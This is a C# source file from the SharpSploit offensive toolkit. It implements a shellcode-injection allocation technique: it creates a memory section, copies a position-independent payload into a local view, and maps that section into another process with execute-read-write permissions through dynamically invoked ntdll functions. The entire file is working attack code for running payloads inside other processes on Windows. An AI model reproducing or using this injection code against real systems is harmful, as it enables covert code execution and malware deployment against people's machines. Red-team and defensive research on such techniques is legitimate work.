using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace SharpSploit.Execution.Injection
{
    /// <summary>
    /// Base class for allocation techniques.
    /// </summary>
    public abstract class AllocationType
    {
        /// <summary>
        /// Allocate the payload to the target process.
        /// </summary>
        /// <param name="payload">The payload to allocate to the target process.</param>
        /// <param name="process">The target process.</param>
        /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
        public IntPtr Allocate(PayloadType payload, System.Diagnostics.Process process)
        {

            Type[] funcPrototype = new Type[] { payload.GetType(), typeof(System.Diagnostics.Process) };

            try
            {
                //Get delegate to the overload of Allocate that supports the type of payload passed in
                System.Reflection.MethodInfo allocate = this.GetType().GetMethod("Allocate", funcPrototype);

                //Dynamically invoke the appropriate Allocate overload
                return (IntPtr)allocate.Invoke(this, new object[] { payload, process });
            }
            //If there is no such method
            catch (ArgumentNullException)
            {
                throw new PayloadTypeNotSupported(payload.GetType());
            }
        }
    }

    //TODO: Add an option for memory protection of allocated payload.

    /// <summary>
    /// Allocates a payload to a target process using locally-written, remotely-copied shared memory sections.
    /// </summary>
    public class SectionMapAlloc : AllocationType
    {
        
        /// <summary>
        /// Allocate the payload to the target process.
        /// </summary>
        /// <param name="payload">The PIC payload to allocate to the target process.</param>
        /// <param name="process">The target process.</param>
        /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
        public IntPtr Allocate(PICPayload payload, System.Diagnostics.Process process)
        {
            //Get a convenient handle for the target process.
            IntPtr procHandle = process.Handle;

            //Create a section to hold our payload
            IntPtr sectionAddress = CreateSection((uint)payload.Payload.Length);

            //Map a view of the section into our current process with RW permissions
            SectionDetails details = MapSection(System.Diagnostics.Process.GetCurrentProcess().Handle, sectionAddress,
                Win32.WinNT.PAGE_READWRITE, IntPtr.Zero, Convert.ToUInt32(payload.Payload.Length));

            //Copy the shellcode to the local view
            System.Runtime.InteropServices.Marshal.Copy(payload.Payload, 0, details.baseAddr, payload.Payload.Length);

            //Now that we are done with the mapped view in our own process, unmap it
            Win32.NtDll.NTSTATUS result = UnmapSection(System.Diagnostics.Process.GetCurrentProcess().Handle, details.baseAddr);

            //Now, map a view of the section to other process. It should already hold our shellcode.
            //If the shellcode supports it, you should use RX memory rather than RWX.
            SectionDetails newDetails = MapSection(procHandle, sectionAddress,
                Win32.WinNT.PAGE_EXECUTE_READWRITE, IntPtr.Zero, (uint)payload.Payload.Length);

            return newDetails.baseAddr;
        }

        /// <summary>
        /// Creates a new Section.
        /// </summary>
        /// <param name="size">Max size of the Section.</param>
        /// <returns></returns>
        private static IntPtr CreateSection(ulong size)
        {
            //Create a pointer for the section handle
            IntPtr SectionHandle = new IntPtr();
            ulong maxSize = size;

            Win32.NtDll.NTSTATUS result = DynamicInvoke.Native.NtCreateSection(ref SectionHandle, 0x10000000, IntPtr.Zero, ref maxSize,
                Win32.WinNT.PAGE_EXECUTE_READWRITE, Win32.WinNT.SEC_COMMIT, IntPtr.Zero);

            //Perform error checking on the result
            if (result >= 0)
                return SectionHandle;
            else
                return IntPtr.Zero;
        }

        /// <summary>
        /// Maps a view of a section to the target process.
        /// </summary>
        /// <param name="procHandle">Handle the process that the section will be mapped to.</param>
        /// <param name="sectionHandle">Handle to the section.</param>
        /// <param name="protection">What permissions to use on the view.</param>
        /// <param name="addr">Optional parameter to specify the address of where to map the view.</param>
        /// <param name="sizeData">Size of the view to map. Must be smaller than the max Section size.</param>
        /// <returns>A struct containing address and size of the mapped view.</returns>
        private static SectionDetails MapSection(IntPtr procHandle, IntPtr sectionHandle, uint protection, IntPtr addr, uint sizeData)
        {
            //Create an unsigned int to hold the value of NTSTATUS.
            UIntPtr ntstatus = new UIntPtr();

            //Copied so that they may be passed by reference but the original value preserved
            IntPtr baseAddr = addr;
            uint size = sizeData;

            uint disp = 2;
            uint alloc = 0;

            //Returns an NTSTATUS value
            Win32.NtDll.NTSTATUS result = DynamicInvoke.Native.NtMapViewOfSection(sectionHandle, procHandle, ref baseAddr, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref size, disp, alloc,
                protection);

            //Create a struct to hold the results.
            SectionDetails details = new SectionDetails(baseAddr, sizeData);

            return details;
        }


        /// <summary>
        /// Holds the data returned from NtMapViewOfSection.
        /// </summary>
        private struct SectionDetails
        {

            public IntPtr baseAddr;
            public uint size;

            public SectionDetails(IntPtr addr, uint sizeData)
            {
                baseAddr = addr;
                size = sizeData;
            }
        }

        /// <summary>
        /// Unmaps a view of a section from a process.
        /// </summary>
        /// <param name="hProc">Process to which the view has been mapped.</param>
        /// <param name="baseAddr">Address of the view (relative to the target process)</param>
        /// <returns></returns>
        private static Win32.NtDll.NTSTATUS UnmapSection(IntPtr hProc, IntPtr baseAddr)
        {
            return (Win32.NtDll.NTSTATUS)DynamicInvoke.Native.NtUnmapViewOfSection(hProc, baseAddr);
        }
    }//end class
}
